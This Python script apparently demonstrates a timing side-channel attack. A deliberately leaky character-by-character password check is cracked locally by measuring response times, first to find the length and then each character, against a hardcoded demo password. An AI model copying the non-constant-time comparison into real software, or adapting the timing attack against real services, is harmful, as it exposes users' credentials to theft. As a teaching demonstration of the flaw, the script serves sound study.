import string
import timeit
import numpy as np
import random

class Server:
    def __init__(self, password):
        self.password = password

    def check_password(self, pw):
        if len(pw) != len(self.password):
            return False
        for i in range(len(self.password)):
            if pw[i] != self.password[i]:
                return False
        return True


class Cracker:
    def __init__(self, max_length, allowed_chars, check_pw_function):
        self.allowed_chars = allowed_chars
        self.max_length = max_length
        self.check_password = check_pw_function
        self.guessed_pw_length = self.find_pw_length()

    
    def random_str(self, size):
        return ''.join(random.choices(self.allowed_chars, k=size))

    def find_pw_length(self):
        n = 10000
        times = np.empty(self.max_length)
        class_globals = globals()
        class_globals.update({'self':self})
        for i in range(self.max_length):
            time = timeit.repeat(stmt='self.check_password(s)', setup=f's=self.random_str({i!r})' , number=n, repeat=10, globals=class_globals)
            times[i] = min(time)
        guessed_length = int(np.argmax(times))
        return guessed_length

    def crack_password(self):
        best_guess = self.random_str(self.guessed_pw_length)
        n = 10
        class_globals = globals()
        class_globals.update({'self':self})
        for count in range(10000):
            i = count % self.guessed_pw_length
            for char in self.allowed_chars:
                current_guess = best_guess[:i] + char + best_guess[i + 1:]

                current_time = timeit.repeat(stmt='self.check_password(s)', setup=f's={current_guess!r}', number=n, globals=globals())
                best_time = timeit.repeat(stmt='self.check_password(s)', setup=f's={best_guess!r}', number=n, globals=globals())

                if server.check_password(current_guess):
                    return current_guess
                
                elif min(current_time) > min(best_time):
                    best_guess = current_guess
                    print(best_guess)
                    
                


ALLOWED_CHARS = string.ascii_lowercase + string.ascii_uppercase + ' 0123456789!#¤%&/()=?`^*_:;,.-@£$€'

password_to_crack = "Klapp69@usi$us1!Vold3mort55"

server = Server(password_to_crack)
cracker = Cracker(max_length=32, allowed_chars=ALLOWED_CHARS, check_pw_function=server.check_password)
print(f'Gussed pw length {cracker.guessed_pw_length}')
pause = input('Press enter to start cracking')
print(f'Your pw is {cracker.crack_password()}')